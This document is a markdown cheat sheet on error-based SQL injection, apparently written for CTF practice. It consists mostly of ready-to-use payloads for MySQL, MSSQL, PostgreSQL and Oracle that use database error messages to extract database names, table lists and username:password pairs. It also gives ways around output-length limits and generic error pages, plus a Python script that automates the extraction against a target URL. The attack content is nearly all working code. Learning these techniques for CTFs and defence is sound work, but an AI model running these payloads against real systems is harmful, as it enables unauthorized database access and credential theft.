# SQL Injection - Error-Based

## Overview
Error-based SQL injection exploits verbose database error messages to extract data. When the database returns detailed error messages that include query results, you can extract data without using UNION or blind techniques.

---

## How It Works

1. Cause a database error that includes data you want to extract
2. The error message reveals the data in the HTTP response
3. Much faster than blind SQLi, but requires error messages to be displayed

---

## Detection

Test if errors are displayed:
```sql
'
"
' AND 1=CAST('a' AS int)--
' AND 1=CONVERT(int,'a')--
```

If you see detailed SQL errors like "Conversion failed" or "Invalid number", error-based injection is possible.

---

## MySQL Error-Based

### Using `extractvalue()`
```sql
' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--
' AND extractvalue(1,concat(0x7e,(SELECT user()),0x7e))--
' AND extractvalue(1,concat(0x7e,(SELECT @@version),0x7e))--

# Extract table names
' AND extractvalue(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),0x7e))--

# Extract data from users table
' AND extractvalue(1,concat(0x7e,(SELECT CONCAT(username,':',password) FROM users LIMIT 0,1),0x7e))--
```

**Note**: `0x7e` is the hex for `~` character, used as a delimiter to make output clear.

### Using `updatexml()`
```sql
' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--
' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)--
' AND updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)--

# Extract data
' AND updatexml(1,concat(0x7e,(SELECT CONCAT(username,':',password) FROM users LIMIT 0,1),0x7e),1)--
```

### Using `exp()` Overflow
```sql
' AND exp(~(SELECT * FROM (SELECT database())x))--
' AND exp(~(SELECT * FROM (SELECT user())x))--

# Extract data
' AND exp(~(SELECT * FROM (SELECT CONCAT(username,':',password) FROM users LIMIT 0,1)x))--
```

### Limitations
- `extractvalue()` and `updatexml()` return max 32 characters
- Use `LIMIT` and `SUBSTRING()` to extract longer data

```sql
# Get first 30 chars
' AND extractvalue(1,concat(0x7e,(SELECT SUBSTRING(password,1,30) FROM users LIMIT 0,1),0x7e))--

# Get next 30 chars
' AND extractvalue(1,concat(0x7e,(SELECT SUBSTRING(password,31,30) FROM users LIMIT 0,1),0x7e))--
```

---

## MSSQL Error-Based

### Using `CAST()`
```sql
' AND 1=CAST((SELECT @@version) AS int)--
' AND 1=CAST((SELECT DB_NAME()) AS int)--
' AND 1=CAST((SELECT name FROM sys.databases) AS int)--

# Extract data
' AND 1=CAST((SELECT TOP 1 username FROM users) AS int)--
' AND 1=CAST((SELECT TOP 1 username+':'+password FROM users) AS int)--
```

### Using `CONVERT()`
```sql
' AND 1=CONVERT(int,(SELECT @@version))--
' AND 1=CONVERT(int,(SELECT DB_NAME()))--

# Extract data
' AND 1=CONVERT(int,(SELECT TOP 1 CONCAT(username,':',password) FROM users))--
```

### Multiple Results
```sql
# Use FOR XML PATH to get multiple rows
' AND 1=(SELECT CAST(CONCAT(username,':',password) AS int) FROM users FOR XML PATH(''))--
```

---

## PostgreSQL Error-Based

### Using Type Conversion
```sql
' AND 1=CAST((SELECT version()) AS int)--
' AND 1=CAST((SELECT current_database()) AS int)--

# Extract data
' AND 1=CAST((SELECT string_agg(username||':'||password,',') FROM users) AS int)--
```

### Using Array Indexing Error
```sql
' AND 1=(SELECT 1 FROM (SELECT version()) as x(y))--
```

---

## Oracle Error-Based

### Using `CTXSYS.DRITHSX.SN()`
```sql
' AND CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))=1--
' AND CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))=1--
```

### Using `UTL_INADDR.GET_HOST_NAME()`
```sql
' AND UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual))=1--
' AND UTL_INADDR.GET_HOST_NAME((SELECT banner FROM v$version WHERE rownum=1))=1--
```

### Using `DBMS_XDB_VERSION.CHECKIN()`
```sql
' AND DBMS_XDB_VERSION.CHECKIN((SELECT banner FROM v$version WHERE rownum=1))=1--
```

---

## Common Patterns for CTFs

### Extract All Table Names (MySQL)
```sql
' AND extractvalue(1,concat(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e))--
```

### Extract All Column Names (MySQL)
```sql
' AND extractvalue(1,concat(0x7e,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'),0x7e))--
```

### Extract Flag/Secret (Common CTF table names)
```sql
' AND extractvalue(1,concat(0x7e,(SELECT flag FROM flags),0x7e))--
' AND extractvalue(1,concat(0x7e,(SELECT secret FROM secrets),0x7e))--
' AND extractvalue(1,concat(0x7e,(SELECT password FROM admin),0x7e))--
```

### Loop Through Multiple Rows
```sql
# First row
' AND extractvalue(1,concat(0x7e,(SELECT CONCAT(username,':',password) FROM users LIMIT 0,1),0x7e))--

# Second row
' AND extractvalue(1,concat(0x7e,(SELECT CONCAT(username,':',password) FROM users LIMIT 1,1),0x7e))--

# Third row
' AND extractvalue(1,concat(0x7e,(SELECT CONCAT(username,':',password) FROM users LIMIT 2,1),0x7e))--
```

---

## Tips & Tricks

### Bypass 32 Character Limit
```sql
# Method 1: Use SUBSTRING to split data
' AND extractvalue(1,concat(0x7e,SUBSTRING((SELECT password FROM users),1,30)))--
' AND extractvalue(1,concat(0x7e,SUBSTRING((SELECT password FROM users),31,30)))--

# Method 2: Use REVERSE to see the end
' AND extractvalue(1,concat(0x7e,REVERSE((SELECT password FROM users))))--

# Method 3: Use MID to extract specific parts
' AND extractvalue(1,concat(0x7e,MID((SELECT password FROM users),1,30)))--
```

### Combine Multiple Values
```sql
' AND extractvalue(1,concat(0x7e,(SELECT GROUP_CONCAT(username,':',password) FROM users),0x7e))--
```

### Handle No Output Scenario
If errors don't show data directly, try:
```sql
# Force a specific error that reveals data position
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)y)--
```

---

## Automation with Python

```python
import requests
import re

url = "http://target.com/page?id=1"

def extract_via_error(query):
    payload = f"' AND extractvalue(1,concat(0x7e,({query}),0x7e))--"
    r = requests.get(url + payload)
    
    # Extract data from error message
    match = re.search(r'~(.+?)~', r.text)
    if match:
        return match.group(1)
    return None

# Usage
db_name = extract_via_error("SELECT database()")
print(f"Database: {db_name}")

tables = extract_via_error("SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()")
print(f"Tables: {tables}")

flag = extract_via_error("SELECT flag FROM flags")
print(f"Flag: {flag}")
```

---

## Detection & Prevention Bypass

### If Generic Errors Are Shown
Some applications show generic "Database error" without details. Try:
- Different error types (type conversion, division by zero, etc.)
- Different functions that might bypass filtering
- Check source code or headers for hidden error details

### If Errors Are Logged But Not Displayed
- Check for information disclosure in other endpoints
- Look for debug/test pages that might show logs
- Try forcing errors in different parts of the application

---

## Quick Reference

```sql
# MySQL - extractvalue()
' AND extractvalue(1,concat(0x7e,(YOUR_QUERY),0x7e))--

# MySQL - updatexml()
' AND updatexml(1,concat(0x7e,(YOUR_QUERY),0x7e),1)--

# MSSQL - CAST()
' AND 1=CAST((YOUR_QUERY) AS int)--

# PostgreSQL - CAST()
' AND 1=CAST((YOUR_QUERY) AS int)--

# Oracle - CTXSYS
' AND CTXSYS.DRITHSX.SN(1,(YOUR_QUERY))=1--
```

Replace `YOUR_QUERY` with:
- `SELECT database()` - Get DB name
- `SELECT table_name FROM information_schema.tables LIMIT 0,1` - Get tables
- `SELECT CONCAT(username,':',password) FROM users LIMIT 0,1` - Get data